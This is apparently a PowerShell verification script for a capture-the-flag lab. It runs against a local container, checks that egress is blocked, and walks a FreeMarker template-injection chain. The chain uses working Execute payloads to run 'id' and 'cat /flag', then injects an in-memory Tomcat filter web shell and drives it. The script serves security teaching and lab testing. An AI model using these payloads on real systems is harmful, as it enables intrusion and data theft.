# =============================================================================
# tests/verify_chain.ps1 - acceptance run for labs/08-freemarker-memshell.
# Every step below was actually executed; the output is pasted into README.md.
#
# Usage:  docker compose up -d   (from the lab dir, with GZCTF_FLAG/DASFLAG/FLAG set)
#         & .\tests\verify_chain.ps1
# =============================================================================
param(
  [string]$Port = "8098",
  [string]$Image = "ctf/freemarker-memshell:latest",
  [string]$Container = "freemarker-memshell"
)
function Line($t) { Write-Host ""; Write-Host "===== $t =====" }
$base = "http://127.0.0.1:$Port"
function Req($url) {
  try { $r = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 25; return @{ ok = $true; status = $r.StatusCode; body = $r.Content } }
  catch {
    $resp = $_.Exception.Response
    if ($resp) { $sr = New-Object IO.StreamReader($resp.GetResponseStream()); return @{ ok = $false; status = $resp.StatusCode.value__; body = $sr.ReadToEnd() } }
    return @{ ok = $false; status = -1; body = $_.Exception.Message }
  }
}
function Tpl($t) { return (Req ("$base/theme/preview?template=" + [uri]::EscapeDataString($t))) }

Line "1. image: /flag must NOT be baked into any layer"
docker run --rm --entrypoint cat $Image /flag
Write-Host "exit=$LASTEXITCODE  (non-zero == flag is not in the image)"

Line "2. container: /flag exists (written by entrypoint.sh at boot)"
docker exec $Container sh -c 'ls -l /flag; cat /flag; echo'

Line "3. /healthz"
$r = Req "$base/healthz"; Write-Host "HTTP $($r.status) body=$($r.body)"

Line "4. /api/lab-info"
$j = Invoke-RestMethod -Uri "$base/api/lab-info"
Write-Host ("id={0}`nno_egress={1}`nengine={2} flag_path={3}`nlevels={4}" -f `
  $j.id, $j.no_egress, $j.engine, $j.flag_path, (($j.levels | ForEach-Object { "$($_.id):$($_.title)" }) -join ' | '))

Line "5. there is no flag-readout endpoint (must all 404)"
foreach ($p in @('/flag', '/flag-readout', '/api/flag')) {
  $x = Req "$base$p"; Write-Host "$p -> $($x.status)"
}

Line "6. egress really blocked, inbound published port still alive"
docker exec $Container iptables -S OUTPUT
Write-Host "--- 6a. outbound TCP 1.1.1.1:80 (wget, 5s timeout) ---"
docker exec $Container sh -c 'wget -T 5 -q -O- http://1.1.1.1/ ; echo "wget exit=$?"'
Write-Host "--- 6b. outbound TCP 93.184.216.34:80 ---"
docker exec $Container sh -c 'wget -T 5 -q -O- http://93.184.216.34/ ; echo "wget exit=$?"'
Write-Host "--- 6c. DNS ---"
docker exec $Container sh -c 'nslookup example.com 2>&1; echo "nslookup exit=$?"'
Write-Host "--- 6d. inbound published port ---"
$r = Req "$base/healthz"; Write-Host "host -> $base/healthz : HTTP $($r.status) $($r.body)"

Line "7. L1 - FreeMarker SSTI present"
$r = Tpl '${7*7}'; Write-Host "template=`${7*7} -> $($r.body.Trim())"
$r = Tpl '${.version}'; Write-Host "template=`${.version} -> $($r.body.Trim())"

Line "8. L2 - arbitrary code execution via freemarker.template.utility.Execute"
$r = Tpl '${"freemarker.template.utility.Execute"?new()("id")}'; Write-Host $r.body.Trim()

Line "8b. ?new really requires TemplateModel (negative control)"
$r = Tpl '${"java.lang.Runtime"?new()}'
$m = [regex]::Match($r.body, 'MiscTemplateException: ([^<\r\n]{0,120})'); Write-Host $m.Groups[1].Value

Line "9. L2b - read /flag with the same primitive"
$r = Tpl '${"freemarker.template.utility.Execute"?new()("cat /flag")}'; Write-Host $r.body.Trim()

Line "10. L3 - inject the in-memory Tomcat Filter (no file written, no egress)"
$payload = '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'
Write-Host "payload: $payload"
$r = Tpl $payload; Write-Host $r.body.Trim()

Line "11. L4 - the brand-new in-memory endpoint answers"
$r = Req "$base/memshell?cmd=id"; Write-Host $r.body

Line "12. L4b - read /flag through the memory shell"
$r = Req ("$base/memshell?cmd=" + [uri]::EscapeDataString('cat /flag')); Write-Host $r.body
Write-Host "--- 12b. base64 variant (b64cmd = base64 of 'cat /flag') ---"
$r = Req "$base/memshell?b64cmd=Y2F0IC9mbGFn"; Write-Host (($r.body -split '<pre')[1] -split '</pre>')[0]

Line "13. memory shell is memory-only (transient by design)"
$r = Req "$base/memshell"; Write-Host "GET /memshell (no cmd) -> HTTP $($r.status)  (falls through to the app)"
Write-Host "restarting the process ..."
docker restart $Container | Out-Null
for ($i = 0; $i -lt 60; $i++) { Start-Sleep -Seconds 2; $h = Req "$base/healthz"; if ($h.ok) { break } }
$r = Req "$base/memshell?cmd=id"
Write-Host "after restart: GET /memshell?cmd=id -> HTTP $($r.status)  (the filter is gone)"

Line "14. Thymeleaf entry point - what is actually reachable (honest result)"
foreach ($t in @('aurora', '__${7*7}__')) {
  $x = Req ("$base/theme/thymeleaf?theme=" + [uri]::EscapeDataString($t))
  $m = [regex]::Match($x.body, 'Error resolving template \[(.*?)\]')
  if ($x.status -eq 200) { Write-Host "theme=$t -> HTTP 200 (rendered normally)" }
  else { Write-Host "theme=$t -> HTTP $($x.status) resolved=[$($m.Groups[1].Value)]  (NOT evaluated)" }
}
foreach ($f in @('header', '__${7*7}__')) {
  $x = Req ("$base/theme/thymeleaf?theme=aurora&fragment=" + [uri]::EscapeDataString($f))
  $m = [regex]::Match($x.body, 'Error resolving template \[(.*?)\]')
  if ($x.status -eq 200) { Write-Host "fragment=$f -> HTTP 200 (included)" }
  else { Write-Host "fragment=$f -> HTTP $($x.status) resolved=[$($m.Groups[1].Value)]  (NOT evaluated)" }
}
Write-Host ""
Write-Host "done."
